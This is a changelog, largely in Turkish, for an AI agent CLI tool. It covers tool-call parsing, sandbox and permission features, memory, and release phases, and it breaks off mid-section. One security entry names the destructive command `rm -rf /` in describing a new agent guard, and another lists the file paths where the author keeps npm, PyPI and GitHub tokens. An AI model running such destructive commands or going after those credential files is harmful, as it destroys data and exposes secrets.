- **Okuma araclari icerigi modele donmuyordu**: `read_file`/`list_dir`/`file_search`/`bash` sonucu ajana sadece "OK" olarak donuyordu → model icerigi goremeyip "okudum ama bos" diye takiliyordu. Feedback artik gercek ciktiyi (content/output/results) modele verir.

Doğrulama: MiniMax ile E2E (oku→edit→calistir; streaming XML/model-adi sizintisiz); **484 test yeşil**, ESLint temiz.

## [5.25.0] - 2026-07-04 — "PROVIDER-AGNOSTİK + STREAMING ALTYAPISI"

### ✨ İyileştirme
- **Provider-agnostik**: agentic düzeltmeler MiniMax'e özel DEĞİL — `workflow.js`'in paylaşılan non-tool-calling dalında çalışır (MiniMax, Groq, Ollama, yerel modeller). Tool-calling sağlayıcıları (OpenAI, Anthropic, Gemini) kendi native `tool_calls` yolunu kullanır (dokunulmadı). `agentic-runner` hem native `tool_calls` hem native XML parse eder → sağlayıcıdan bağımsız çalışır.
- **Streaming altyapısı**: canlı akışta tool-call/skill protokol jetonlarını (`<minimax:tool_call>`, `<invoke>`, `<skill>`) gizleyip düz metni gösteren, chunk sınırında bölünen tag'leri doğru işleyen akış filtresi (`makeStreamFilter`, 4 test). Tam devreye alma (streaming-güvenli model-adı temizleme ile birlikte) sonraki adım.

> Not: v5.24.0'daki büyük düzeltmeler (MiniMax dosya yazma, komut çalıştırma, memory recall) bu sürümde de yer alır.

## [5.24.0] - 2026-07-04 — "AGENTIC SERTLEŞTİRME" (MiniMax native tool-call + komut çalıştırma)

Kök neden: **MiniMax M2.5 agentic bir model** — tool call'ları OpenAI `tool_calls` JSON'u yerine metin içinde native XML olarak üretir (`<minimax:tool_call><invoke name="write_file">...`) ve skill'i `<skill>ad</skill>` ile yükler. 5.23.0'ın tek-atış JSON planı bunu yakalayamıyordu; `JSON.parse` patlayıp boş `catch{}` yutunca dosya sessizce yazılmıyordu ("masaüstünde yarış oyunu yapamadı").

### ✨ Yeni
- **`src/tools/agentic-runner.js`**: MiniMax'in native XML/skill protokolünü parse edip gerçek araçları çalıştıran bounded agentic döngü (parse→execute→sonucu geri besle→dur, max 15 iterasyon). `workflow.js`'in non-tool-calling dalı buna bağlandı. 13 yeni birim testi.
- **Komut çalıştırma (onaylı)**: ajan artık `bash` ile npm/git/node/test çalıştırıp çıktıya göre devam edebilir — gerçek **yaz→çalıştır→test→düzelt** döngüsü.

### 🐛 Düzeltme
- **MiniMax dosya yazma**: native `<invoke>`/`<skill>` parse edilip gerçek araçlara yönlendiriliyor; büyük içerikteki JSON-kaçış sorunu ortadan kalktı.
- **Memory recall split-brain**: hafıza `default.json`'da tutulurken okuyucular `<userName>.json` arıyordu → chat/code kullanıcıyı hiç hatırlamıyordu ("adım ne?"→"bilmiyorum"). `loadUserMemory` + `repl.loadMemory` artık `<user>.json` + legacy `default.json`'ı birleştirir (isim-eşleşme guard'ı).
- **Bot personası**: jenerik "Asistan" placeholder'ı gerçek persona (örn. "Hinata") ile eziliyor.

### 🔒 Güvenlik
- **Ajan modunda yıkıcı komut guard'ı**: varsayılan 'full' politika `rm -rf /`'i bile geçiriyordu (insan için bilinçli olabilir, model için değil). Agentic-runner artık `isDangerousCommand`'ı politikadan bağımsız uygular — yıkıcı komutlar ajan tarafından **çalıştırılmaz**. Diğer ~85 araç allowlist dışı (yalnızca write_file/read_file/edit_file/skill_view/bash).

Doğrulama: gerçek MiniMax API ile uçtan uca (yarış oyunu + "node script yaz&çalıştır"→42); **474 test yeşil**.

## [5.23.0] - 2026-07-02 — "NON-TOOL-CALLING FIX" (MiniMax dosya yazma)

### 🐛 Düzeltme
- **MiniMax (non-tool-calling) dosya oluşturamıyordu**: workflow non-tool-calling path'inde simple/complex ayrımı yoktu — LLM yanıtını doğrudan sohbete yazıp geçiyordu. Artık complex görevlerde LLM'den JSON plan istenir, dosyalar Node.js tarafında yazılır.

## [5.22.0] - 2026-07-02

## [5.21.0] - 2026-07-02 — "GÜVENİLİRLİK SPRİNTİ" (gerçek API E2E denetimi)

Gerçek MiniMax API anahtarıyla uçtan uca canlı test turu; bulunan her hata düzeltilip yine canlı doğrulandı. 461 test yeşil.

### 🐛 Kritik Düzeltmeler

- **Pipe/script modu tamamen kırıktı**: paste algılayıcı non-TTY girdide (pipe, script, CI) çok satırlı chunk'ları "yapıştırma" sanıp komutları yutuyordu — `echo "soru" | natureco chat` hiç çalışmıyordu. Non-TTY'de saf geçiş + regresyon testi.
- **EOF yanıtı kesiyordu**: pipe girdisi bittiğinde REPL, LLM yanıtı hâlâ üretilirken kapanıyordu. Artık süren işlem beklenir; kapalı readline'da `prompt()` çağrısı (Node 24 "readline was closed" çökmesi) korunur; non-TTY'de inquirer soruları güvenli varsayılanlara döner.
- **Maliyet takibi hiç kayıt yapmıyordu**: `recordUsage` hiçbir API yoluna bağlanmamıştı — `natureco cost` hep $0.00 gösteriyordu. Üç yola da (normal, streaming, Anthropic) bağlandı.
- **Streaming'de sessiz token kaybı**: SSE satırı chunk sınırında bölününce parse hatası yutulup içerik kayboluyordu. Buffer taşıma eklendi.
- **REPL profil izolasyonunu deliyordu**: yerel `getConfig` kopyası `--profile` bayrağını yok sayıp gerçek config'i okuyordu; memory/sessions/repl-state yolları da homedir'e sabitti. Hepsi merkezi config/profile bağlandı.
- **Windows'ta `npm install` kırılabiliyordu**: `postinstall: ... || true` cmd.exe'de geçersiz (`true` yok). `scripts/postinstall.js`'e bağlandı — asla kurulum kırmaz, CI'da atlanır; `scripts/` npm paketine eklendi (`files`).
- **EPIPE çökmesi**: `natureco help | head` gibi boru zincirlerinde 255 ile çöküyordu. EPIPE artık normal akış sayılır (exit 0).

### 💰 Maliyet

- **`ask` %97 daha ucuz**: tek atımlık soruda 47 aracın şeması (~15K token) gönderiliyordu; varsayılan artık araçsız (~470 token), `--tools` ile açılır.
- MiniMax URL toleransı: `.../v1` ile biten providerUrl `404 page not found` veriyordu; endpoint kurucu tek kaynağa (`buildChatEndpoint`) indirildi ve `/v1` toleranslı.
- `$0.15¢` karışık para gösterimi düzeltildi (1 sentin altı yalnızca `¢`).

### 🔧 İyileştirmeler

- Yazım hatasında komut önerisi: `natureco docto` → `(Did you mean doctor?)`.
- `workflow` aracı tanımı ve sistem yönergesi netleştirildi: sohbet/bilgi sorusunda araç çağrılmaz.
- Girdide BOM/sıfır-genişlik karakter temizliği (PowerShell echo BOM'u).
- `NATURECO_DEBUG=1` ile unhandled rejection stack'i stderr'a yazılır.
- Windows test uyumluluğu: `USERPROFILE` override, yol ayracı, spawn timeout'ları — 15 flaky test düzeltildi.
- Kök dizin temizliği: `fibonacci.js`, `README.md.bak`, `.codedna.db`, ölü `postinstall-doctor.js` kaldırıldı; repo URL'leri `natureco-official`'a eşitlendi.

## [5.20.0] - 2026-06-27 — "CLAUDE CODE FEATURES CLONE"

13 Claude Code özelliği klonlandı ve her iki CLI moduna (REPL + Code Agent) entegre edildi. 28 test dosyası, 463 test.

### ✨ Yeni Özellikler

- **Hooks Sistemi** (`src/utils/tool-hooks.js`): Pattern-based pre/post hooks. `ToolName(glob)` syntax ile allow/deny/ask/notify/record.
- **Permission Sistemi** (`src/utils/permissions.js`): Granular allow/deny/ask rules + persistent approval cache (disk).
- **Plan Mode** (`src/utils/plan-mode.js`): 3-state (normal → planning → review). Read-only mod, `/plan on|approve|reject|show` CLI.
- **Worktrees** (`src/utils/worktree.js`): Git worktree + copytree fallback. EnterWorktree/ExitWorktree virtual tools.
- **Sandbox** (`src/utils/sandbox.js`): none/basic/strict seviyeleri. Strict'te network komutları bloklanır, timeout kısalır.
- **Fallback Chain** (`src/utils/fallback-chain.js`): 3 model sıralı düşüş. error/ratelimit/timeout'da otomatik geçiş.
- **Effort Levels** (`src/utils/effort-levels.js`): low/medium/high — token limit, iteration, temperature kontrolü.
- **File History** (`src/utils/file-history.js`): Snapshot-based undo. `.natureco/history/` altında 20 snap/file. RestoreFile + FileHistory tools.
- **Session Search** (`src/utils/session-search.js`): Full-text `.natureco/sessions/` arama. SearchSessions tool.
- **Task Sistemi** (`src/utils/tasks.js`): Child process background task manager. CreateTask/ListTasks/GetTaskResult/StopTask tools.
- **Cron/Monitor** (`src/utils/cron.js`): Cron expression scheduler. ScheduleTask/ListScheduledTasks/RemoveScheduledTask tools.
- **Structured Output** (`src/utils/structured-output.js`): JSON schema response format. Config'dan `response_format` okur.
- **Ultra Review** (`src/utils/ultra-review.js`): 4-focus code review (security/style/logic/performance). UltraReview tool.

### 🔧 Entegrasyon

- `repl.js`: 14 virtual tool inject, plan review flow, permission + hooks + plan mode pipeline (`executeOne()`)
- `code_v5.js`: Aynı 14 virtual tool, `/plan` CLI, permission/hooks/plan/effort/fallback entegrasyonu
- `tools.js`: Sandbox strict seviyesinde bash/shell_command network bloklama
- Otomatik file snapshot: write_file/edit_file çalıştığında history snapshot alınır

### 🧪 Test

- 4 yeni test dosyası: tool-hooks (13), permissions (10), plan-mode (15), worktree (9)
- Toplam: 28 test dosyası, 463 test — tamamı yeşil

## [5.7.1] - 2026-06-25 — "BUG FIX SPRINT"

Comprehensive audit-driven sprint: 7 real runtime bugs fixed, 6 new
utility modules with ~90%+ test coverage, ESLint + flat config installed,
test scripts wired to vitest (previously `npm test` was just running
`--help`). Pure quality / stability — no public API change.

### 🐛 Fixed (runtime bugs)
- **REPL `/system <text>` crashed with TypeError** (`commands/repl.js`):
  systemPrompt was `const` but the slash handler reassigned it. → `let`.
- **Telegram + IRC + SMS message handlers ReferenceError on every inbound**
  (`commands/gateway-server.js`): `cleanCommand` variable never declared
  in those scopes. Added `stripSlashPrefix(text)` helper mirroring the
  v5.6.41+ WhatsApp transform; all three channels now derive it correctly.
- **Tool-alias rewrites threw ReferenceError** (`utils/tools.js`): typo
  `TOOL_ALIASES[t.name]` where the local was `ALIAS_MAP`. Fixed.
- **5 silent `no-undef` ReferenceErrors** across `commands/{chat,nodes,
  gateway,config}.js` + `utils/error.js` — missing `require()` calls
  that had been hidden by CommonJS load-order side effects (would
  crash on a fresh process or worker restart).

### 🔒 Security
- **exec-approvals.json was world-readable (0644)** — local privilege
  escalation hedef. Now 0o600 (file) + 0o700 (parent dir), with
  auto-tightening of pre-existing loose installs. Removed dangling
  `APPROVALS_SOCKET_PATH` constant + unused `net` require (socket never
  existed; storage is the JSON file).
- **Anthropic `system` field sent as `''` or `undefined`** (api.js): now
  always non-empty via `extractSystemForAnthropic(messages)` helper with
  a meaningful default. Prevents 400 "system: cannot be empty" on
  recent Messages API revisions + unanchored-model drift.

### ⚙️ Reliability
- **Crash-safe atomic file writes** for sessions, history, memory,
  approvals (new `utils/atomic-file.js`: temp-write + rename(2)).
  Prior `fs.writeFileSync` left truncated JSON on SIGTERM / OOM /
  power loss.
- **Memory fact cap silent fail fixed** (`tools/memory_write.js`): the
  hardcoded `slice(0, 15)` ran BEFORE push, so once 15 high-score
  facts were saved, every new write was the next iteration's eviction
  victim — silently. Now: `MAX_FACTS_PER_USER` default 50 (env
  `NATURECO_MAX_FACTS`), cap applied AFTER push, just-written fact
  pinned at top, `console.warn` on breach (`NATURECO_QUIET_MEMORY=1`
  to silence).
- **Global `unhandledRejection` + `uncaughtException` handlers**
  (`utils/process-errors.js`, installed as the first statement in
  `bin/natureco.js`): structured audit log entry + friendly Turkish
  stderr + exit 1, instead of Node's default ugly stack dump.
- **Dashboard port + host de-hardcoded** (`utils/ports.js`):
  `NATURECO_DASHBOARD_PORT` + `NATURECO_DASHBOARD_HOST` env overrides
  with range/format validation. Previously 7421 was inlined in two
  separate modules; drift risk eliminated.

### 🧹 Refactor (DRY)
- **Streaming tool-call delta accumulator** extracted to
  `utils/streaming-tools.js`. The per-index buffer + string-concat
  pattern was duplicated in `utils/api.js` and `commands/repl.js` —
  any drift between them would silently break tool calling on
  Groq / MiniMax / DeepSeek / OpenAI.
- **Provider detection** centralized in `utils/provider-detect.js`.
  Three call sites (`utils/api.js`, `commands/setup.js`) used three
  different versions of the URL→provider mapping; the setup.js variant
  was already incorrect (missed `minimax.cn`). Helper makes
  `detectProvider`, `isMiniMax`, `isAnthropic`, `isGroq`, `isOllama`
  the single source of truth.

### 🧪 Testing
- **`npm test` actually runs tests now** — was previously just
  `node bin/natureco.js help` (a load-smoke). Wired to `vitest run`.
- **+95 unit tests** across 9 new spec files. Coverage of the new
  utility modules: streaming-tools 97%, provider-detect 100%,
  process-errors 88%, ports ~93%, atomic-file ~93%, memory_write
  internals ~85%.
- **Test suite: 12 files / 270 tests → 21 files / 365 tests.**
- `@vitest/coverage-v8` dev dep added; `npm run test:coverage` works.
- **prepublishOnly gate strengthened**: now runs `node --check` +
  `eslint --quiet` + `vitest run` in sequence. A broken publish to
  `npm install -g natureco-cli` users is now strictly blocked.

### 🔧 Tooling
- **ESLint v9 flat config added** (`eslint.config.js`):
  `@eslint/js` recommended + warn-level checks for unused-vars,
  useless-escape, case-declarations, control-regex. Test files get
  ES-module sourceType + vitest globals; `src/tools/browser*.js`
  get browser globals for Playwright page.evaluate context.
  Scripts: `npm run lint`, `lint:fix`, `lint:errors-only`.
  After the no-undef fixes: 0 errors (293 unused-vars warnings
  remain for a follow-up sprint).

## [5.7.0] - 2026-06-24 - SOUL SCRUBBED (MINOR)

### Security
- Personal paths removed from README (Users/gencay/.hermes/sasuke-notes*.md and Downloads/notes.py)
- soul/ directory removed from repo (7 files: AGENTS, IDENTITY, SOUL, notes/{INDEX,note1-5}.md)
  - Note: files remain in git history; use git filter-repo for full purge
- Internal docs ignored via .gitignore (DEPLOY_*, LAUNCH, AUDIT, TEST_PLAYBOOK, etc.)

### Changed
- Minor version bump 5.6.48 -> 5.7.0 (patch cascade rule: 5+ consecutive patches)

## [5.6.48] - 2026-06-24 — "README SHARDED"

### 📚 Documentation
- **README.md + README_EN.md updated** for v5.6.47
  - v5.6.47 + v5.6.46 added to "Recent Releases" table
  - New "v5.6.47 — Sharded Memory System" hero section in "What's New"
  - Folder structure diagram (`soul/notes/{INDEX,note1-5}.md`)
  - Cross-project reference to `sasuke-notes*.md`
- npm registry will reflect updated README on next publish

## [5.6.47] - 2026-06-24 — "SOUL SHARDED"

### ✨ Added
- **soul/notes/ — Sharded memory system for NatureCo CLI agent**
  - `INDEX.md` (2 KB) — file map, navigation
  - `note1.md` (3 KB) — Patron & persona (Gencay, "Patron" hitap, çilek yasağı)
  - `note2.md` (4 KB) — Project structure, 120+ commands, build/publish workflow
  - `note3.md` (3.8 KB) — Tokens, red lines, masking fixes (npm `.npmrc`, PyPI `/tmp/pypi_token.txt`, GitHub `/Users/gencay/.natureco/github_token`)
  - `note4.md` (6 KB) — 7-step release workflow (local commit → tag → push → publish → cache-bust → GitHub release → verify)
  - `note5.md` (5 KB) — Skills, tools, channels, MCP, integrations
- **SOUL.md updated** to index-based: "read soul/notes/INDEX.md" + 1-line quick reference
- **Infinite scalability** — `note6.md`, `note7.md`... as needed
- **Pattern mirrors** `/Users/gencay/.hermes/sasuke-notes*.md` for cross-project memory
- 1009 + 125 = 1134 new lines, ~28 KB detailed context

## [5.6.46] - 2026-06-24 — "README OVERHAUL"

### 📚 Documentation
- **README.md full rewrite** — 5.6.x serisine uygun:
  - Hero slogan: "Yapay Zekânın Gücü artık parmaklarının ucunda / Terminalin hızını NatureCo ile keşfet"
  - ASCII art banner
  - Node badge: `>=16.0.0` (package.json engines ile uyumlu)
  - npm version, downloads, GitHub stars badge'leri
  - Quick Start 4 adım: install → setup → chat → code
  - 51 komut / 10 kategori, gerçek örnekler
  - Discord `https://discord.gg/4FwumbWph`, Twitter `https://twitter.com/naturecoofficial`
  - GitHub: `natureco-official/natureco-cli`
  - Karşılaştırma tablosu (Claude Code / Hermes / OpenClaw)
  - 30s setup wizard tanıtımı

### 🎯 Versiyon Notu
- 5.6.45 → 5.6.46 (patch bump, README-only release)
- Kod değişikliği yok, npm sayfası güncellendi
- Yeni kullanıcılar README üzerinden kurulum yapabilir

---

## [4.2.0] - 2026-06-22 — "LAUNCH READY"

### 🚀 Headline
**v4.2.0 ile NatureCo CLI npm'e publish'a hazır.** OpenClaw'ın açık ara üstünü.

### ✨ Added
- **package.json launch-ready:**
  - Açıklayıcı description, 18 keywords (SEO optimize)
  - `repository`, `bugs`, `homepage`, `author` (Gencay Olgun) alanları
  - `postinstall` script: `natureco doctor` otomatik çalışır
  - `prepublishOnly`: syntax check + test
  - Files: README, CHANGELOG, AUDIT, DEPLOY docs dahil
- **LAUNCH.md** — Pazarlama materyali:
  - Reddit/HN/Twitter/Medium/Discord mesajları (Parton imzalı)
  - Hedef kitle segmentleri
  - 30-gün başarı metrikleri
  - Launch checklist
- **npm publish adımları** dokümante edildi

### 📊 Final İstatistikler
- 152 JS dosyası (8 yeni eklendi)
- 32K+ satır kod
- 11 utility modülü (5 yeni)
- 95+ CLI komutu (8 yeni)
- 8 phase, 0 blocking bug
- v2.23.32 → v4.2.0 (8 minor versiyon)

### 🎯 Hedef
- İlk hafta: 1,000 npm indirme
- İlk ay: 500 GitHub yıldız, 200 aktif kullanıcı

---

## 🏁 TÜM PHASE'LER TAMAMLANDI

- [x] Phase 0: Audit
- [x] Phase 1: Brand & Onboarding (v3.0.0)
- [x] Phase 2: Defense-in-Depth (v3.1.0)
- [x] Phase 3: Self-Evolving Skills (v3.2.0)
- [x] Phase 4: Cost-Optimized (v3.3.0)
- [x] Phase 5: Developer Experience (v3.4.0)
- [x] Phase 6: NatureCo Native (v4.0.0)
- [x] Phase 7: Multi-Agent (v4.1.0)
- [x] Phase 8: Launch Ready (v4.2.0)

**OpenClaw'ın yerini almaya hazırız.** 🌿

### 🤖 Headline
Tek agent değil, **agent ağı**. OpenClaw single-agent — NatureCo multi-agent.

### ✨ Added
- **`src/utils/sub-agent.js`** genişletildi: 3 → 8 agent tipi
  - `explore`, `general`, `review` (mevcut)
  - **Yeni:** `seo`, `content`, `security`, `translator`, `debugger`
  - Her biri farklı system prompt ile uzmanlaşmış
- **`natureco team`** — Multi-agent orkestrasyon komutu
  - `team list`: 8 agent tipi ve açıklamaları
  - `team status`: Son çalışan agent istatistikleri (toplam/çalışan/tamamlanan/başarısız)
  - `team spawn <type> <task>`: Tek agent çalıştır (token kullanım raporu ile)
  - `team parallel '<json>'`: N agent paralel çalıştır, sonuçları birleştir
- **Mevcut `spawnSubAgent`/`spawnParallel` altyapısı** zaten vardı (Phase 7 bunu sadece genişletti)

### 🔜 Final Phase
- v4.2.0 — Phase 8: Launch & marketing

### 🌿 Headline
Generic agent değil, **NatureCo platformunun native parçası**. OpenClaw generic — NatureCo natureco.me'ye özel.

### ✨ Added
- **`natureco naturehub`** — Nature Hub topluluk akışına içerik yayınla (post|list|trending|config)
  - Token tabanlı, `natureco config set naturehubToken`
  - Offline: yerel JSONL'e kaydeder, API hazır olunca gönderir
- **`natureco medium`** — Parton'un ayda 4 makale hedefi için (draft|publish|list)
  - Markdown dosyasından taslak/yayın
  - Medium integration token gerektirir
  - Yerel taslak kayıt (`~/.natureco/medium-drafts/`)
- **`natureco seo`** — URL SEO denetimi (audit|meta|speed)
  - Title, description, canonical, OG, Twitter Card, schema.org
  - H1-H3 heading analizi, image alt kontrolü
  - Word count ve 100-üzerinden skor
  - **Test: natureco.me → 71/100, H1 eksik bildirildi**
- **`natureco xp`** — Gamification (stats|leaderboard|rewards)
  - 8 seviye: Tohum → Galaksi (0 → 12,000 XP)
  - 7 farklı ödül (sticker → Founder statüsü)
  - XP history (son 100 kayıt)

### 🎯 Phase 6 Canlı Test
- **SEO audit natureco.me**: 71/100 skor, H1 eksikliği, title uzunluğu tespit edildi
- **XP sistemi**: 0 XP, Lv.1 Tohum, sonraki Filiz (100 XP)

### 🔜 Coming
- v4.1.0 — Phase 7: Multi-agent orkestrasyon (sub-agents)
- v4.2.0 — Phase 8: Launch & marketing

### 🖥️ Headline
OpenClaw "kara kutu". NatureCo CLI **şeffaf** — tüm veriler tek bir local dashboard'da.

### ✨ Added
- **`src/utils/dashboard-server.js`** — Local web dashboard
  - Port 7421, vanilla JS + HTML (framework yok)
  - 6 widget: bugünkü maliyet, yüklü skill, aktif cron, audit kayıtları, provider bazlı maliyet, self-evolving proposals, son tool çağrıları
  - Otomatik 5 saniyede bir yenileme (auto-refresh)
  - JSON API endpoint (`/api`)
  - PID file ile kolay durdurma
- **`src/commands/dashboard.js`** — `natureco dashboard [start|status|stop|url]`
  - Port kontrolü (zaten çalışıyor mu?)
  - Process kill ile temiz shutdown
  - macOS/Windows/Linux uyumlu tarayıcı açma

### 📊 Phase 5 Dashboard Test
- HTTP 200, 8575 byte HTML
- API JSON: tüm Phase 3 proposal verileri görünüyor
- Real-time auto-refresh çalışıyor

### 🔜 Coming
- v4.0.0 — Phase 6: NatureCo özgü entegrasyonlar (naturehub, medium, seo)
- v4.1.0 — Phase 7: Multi-agent orkestrasyon
- v4.2.0 — Phase 8: Launch & marketing

### 💰 Headline
OpenClaw kullanıcıları ayda $50-200 token faturası ödüyor. NatureCo hedef: $5-15/ay akıllı routing ile.

### ✨ Added
- **`src/utils/cost-tracker.js`** — Maliyet hesaplama ve model router
  - 21 model × provider için güncel fiyat tablosu (Groq, OpenAI, Anthropic, DeepSeek, Together, Fireworks, Ollama)
  - Token → USD dönüşümü (input/output ayrı)
  - **Model router**: 4 karmaşıklık seviyesi (simple/medium/complex/creative)
    - Basit soru → llama-3.1-8b-instant ($0.05 in)
    - Kod → llama-3.3-70b-versatile veya claude-sonnet
    - Yaratıcı yazı → claude-sonnet veya gpt-4o
  - **Otomatik karmaşıklık tahmini**: prompt içeriğinden (kod işaretleri, anahtar kelimeler, uzunluk)
  - **Bütçe sistemi**: günlük $5, aylık $100 limit, %75 uyarı, %90 otomatik downgrade
- **`src/commands/cost.js`** — `natureco cost [today|week|month|all|budget|set|model|prices]`
  - Renkli bar chart'lar
  - Provider ve model bazlı breakdown
  - Bütçe durumu görselleştirmesi
- **`bin/natureco.js`** — `cost` komutu kayıtlı

### 📊 Phase 4 Test Sonucu
- 3 farklı provider kullanımı kaydedildi → $0.0252 toplam
- Basit prompt: `groq:llama-3.1-8b-instant` önerildi (en ucuz)
- Karmaşık kod prompt: `groq:llama-3.3-70b-versatile` önerildi
- Bütçe görsel: %1 kullanım (günlük limit $5)

### 🔜 Coming
- v3.4.0 — Phase 5: Geliştirici deneyimi (dashboard)
- v4.0.0 — Phase 6-8: NatureCo native + launch

### 🧠 Headline
Kullanımın tekrar eden pattern'lerinden otomatik skill oluştur. Hermes Agent'tan ilham, NatureCo uyarlaması.

### ✨ Added
- **`src/utils/pattern-detector.js`** — Tool çağrı pattern detector
  - Normalize: URL'ler, dosya yolları, sayılar, UUID'ler, ISO tarihler, email'ler, hex string'ler generic hale getirilir
  - Sliding window (son 1-5 çağrı)
  - Aynı pattern 3+ kez tekrar → proposal oluştur
  - 24 saat cooldown (aynı pattern'i tekrar önerme)
  - Persistent log: `~/.natureco/patterns.json`
  - Proposal kayıt: `~/.natureco/skill-proposals.json`
- **`src/commands/skills.js`** — 4 yeni alt komut:
  - `skills suggest` — Bekleyen proposal'ları göster
  - `skills accept <id>` — Proposal'ı SKILL.md olarak oluştur
  - `skills reject <id>` — Proposal'ı reddet
  - `skills forget` — Pattern hafızasını sıfırla
- **Otomatik SKILL.md üretimi** — accepted proposal'lardan `~/.natureco/skills/<name>/SKILL.md`
- **Audit entegrasyonu** — Her skill kabulü `SKILL_AUTO` action'ı olarak loglanır

### 🐛 Fixed
- Pattern detector'da fingerprint bug'ı: normalize edilmiş string'ler tekrar normalize ediliyordu (boş pattern üretiyordu)

### 🔜 Coming
- v3.3.0 — Phase 4: Maliyet optimizasyonu (model router, token budget)
- v3.4.0 — Phase 5: Geliştirici deneyimi (dashboard)

### 🛡️ Headline
OpenClaw'ın en zayıf olduğu alan: güvenlik. v3.1.0 ile NatureCo CLI artık OpenClaw'tan **açık ara daha güvenli**.

### ✨ Added
- **`src/utils/audit.js`** — Merkezi audit log sistemi (JSONL, 30 gün retention, async, non-blocking)
  - 19 action tipi (command, approval, tool, auth, secret, config, cron, skill, error, info)
  - 24 saat istatistik, dosya bazlı günlük log'lar, auto-cleanup
- **`src/utils/secret-scanner.js`** — 22 bilinen secret pattern tespiti (OpenAI, Anthropic, Groq, AWS, GitHub, Slack, Stripe, Tavily, HuggingFace, Replicate, Firecrawl, NatureCo, JWT, private key, vs)
  - Shannon entropi analizi (bilinmeyen format yüksek entropi secret'lar)
  - Otomatik maskeleme (`sk-a***9012`)
  - Cross-platform dosya tarama (skip: node_modules, .git, dist, lock files)
- **`src/commands/audit.js`** — `natureco audit [today|stats|show|search|files|cleanup|tail]`
  - Renkli action kategorileri
  - 24 saat bar chart
  - Canlı tail modu (yeni kayıtları real-time göster)
- **`bin/natureco.js`** — `audit` komutu kayıtlı
- **`src/commands/doctor.js`** — 2 yeni check:
  - `auditLog`: Audit dizini yazılabilir mi?
  - `secretsClean`: Çalışma dizininde secret var mı?

### 📊 Phase 2 Doctor Sonuçları
- **10 check** toplam (Phase 1'de 8, ilk halde 5)
- 6/10 geçti (fresh setup'ta config henüz yok — beklenen)

### 🔜 Coming
- v3.2.0 — Phase 3: Self-evolving skills
- v3.3.0 — Phase 4: Maliyet optimizasyonu
- v3.4.0 — Phase 5: Geliştirici deneyimi

### 🔥 Headline
OpenClaw'dan daha güvenli, daha hızlı, daha ucuz. İlk kurulum 60 saniye.

### ✨ Added
- **First-run auto-detection** (`bin/natureco.js`) — `natureco` (boş argüman) kurulum yoksa otomatik setup wizard'a yönlendirir
- **`src/utils/branding.js`** — merkezi brand kimliği (renkler, ASCII art, daily tip)
- **Doctor 3 yeni check:** `apiKeyValid`, `providerReachable`, `dataDirs` (auto-fix ile)
- **Setup wizard** artık tam NatureCo logosuyla açılıyor (eski ASCII cat yerine)
- **README v3.0 notları + OpenClaw karşılaştırma tablosu**

### 🐛 Fixed
- **Doctor `diskSpace` bug:** `os.freemem()` (RAM) kullanıyordu, artık gerçek disk alanı (`df -k`, Windows: `Get-PSDrive`)
- **README/package.json versiyon senkron:** 2.19.1 → 3.0.0
- **README Node engine:** >=16 → >=18 (package.json ile uyumlu)

### 📁 Audit (Phase 0)
- 152 JS dosyası, syntax %100 temiz, 0 require hatası
- 10 TODO/FIXME, 10 boş fonksiyon, 5 deprecated existsSync tespit edildi
- AUDIT.md oluşturuldu

### 🔜 Coming in next versions
- v3.1.0 — Phase 2: Defense-in-depth güvenlik (approval v2, audit log, sandbox)
- v3.2.0 — Phase 3: Self-evolving skills
- v3.3.0 — Phase 4: Maliyet optimizasyonu (model router)
- v3.4.0 — Phase 5: Geliştirici deneyimi (dashboard)
- v4.0.0 — Phase 6-8: NatureCo native + launch

## [1.0.0] - 2026-05-10

### Added

#### Core Features
- **First-Time Setup Wizard**
  - Automatic setup on first run
  - Interactive API key validation with live check
  - Bot selection from user's bots
  - Optional Telegram integration
  - Creates `~/.natureco/` directory structure
  - Beautiful boxed interface
  - Can be run manually with `natureco setup`

- **Authentication System**
  - Login/logout with API key
  - Secure storage in `~/.natureco/config.json`
  - Support for both `nco_` and `nc_` key formats

- **Bot Management**
  - List available bots
  - Interactive chat with bots
  - Bot switching within chat

- **Gateway Screen**
  - Beautiful boxed interface
  - Login status display
  - Active bot information
  - Skill and MCP server counts

#### Project Management
- **Project Initialization**
  - `natureco init` command
  - Creates `.natureco/` folder structure
  - Interactive bot and skill selection
  - Generates `config.json` and `AGENTS.md`

- **Configuration System**
  - Global config: `~/.natureco/config.json`
  - Project config: `.natureco/config.json`
  - Get/set/list commands
  - Hierarchical config management

#### Skills System
- **Three-Tier Hierarchy**
  - Built-in skills (code-review, summarize, translate)
  - User skills (`~/.natureco/skills/`)
  - Project skills (`.natureco/skills/`)

- **Skill Management**
  - List installed skills
  - Install from NatureHub
  - Remove skills
  - Update all skills
  - Create new skill templates

- **Skill Features**
  - Automatic prompt injection in chat
  - Requirement gating (bins, env vars, OS)
  - SKILL.md format with frontmatter
  - Metadata validation

#### Chat Features
- **Interactive Chat**
  - Real-time conversation with bots
  - Readline interface with arrow key support
  - Command history (last 100 commands)
  - Conversation history saved to `~/.natureco/history/`

- **Chat Commands**
  - `/clear` - Clear screen
  - `/bot [name]` - Switch bot or list bots
  - `/skills` - Show active skills
  - `/help` - Show chat help
  - `exit`, `quit` - Exit chat

- **Quick Commands**
  - `natureco ask "<question>"` - Single-shot questions
  - `natureco run <script.md>` - Run markdown scripts
  - Pipe support for ask command

#### MCP Server Support
- **Server Management**
  - List MCP servers
  - Add servers (interactive or template-based)
  - Remove servers
  - Test connections
  - Enable/disable servers

- **Ready Templates**
  - `filesystem` - File system operations
  - `github` - GitHub operations
  - `postgres` - PostgreSQL database
  - `sqlite` - SQLite database
  - `brave-search` - Web search

- **Configuration**
  - Stored in `~/.natureco/config.json`
  - Environment variable support
  - Auto-approve lists
  - Disable/enable flags

#### AGENTS.md Support
- Project-specific bot instructions
- Automatic prompt injection in chat
- Markdown format
- Created during `natureco init`

#### Update System
- **Auto-Update Notifications**
  - Checks every 24 hours
  - Notifies when new version available
  - Uses update-notifier package

- **Manual Update Check**
  - `natureco update` command
  - Shows current and latest versions
  - Provides update instructions

#### UI/UX
- Colorful terminal interface with chalk
- Loading animations with spinners
- Boxed gateway screen
- Monospace formatting
- Error messages in Turkish
- Cross-platform support (Windows, macOS, Linux)

### Technical Details

#### Dependencies
- `chalk@4.1.2` - Terminal colors
- `commander@11.1.0` - CLI framework
- `inquirer@8.2.7` - Interactive prompts
- `boxen@5.1.2` - Terminal boxes
- `ora@5.4.1` - Spinners
- `conf@10.2.0` - Config management
- `update-notifier@6.0.2` - Update notifications

#### API Integration
- Base URL: `https://api.natureco.me`
- Endpoints:
  - `GET /api/v1/bots` - List bots
  - `POST /api/agent/chat` - Chat with bot
- Headers:
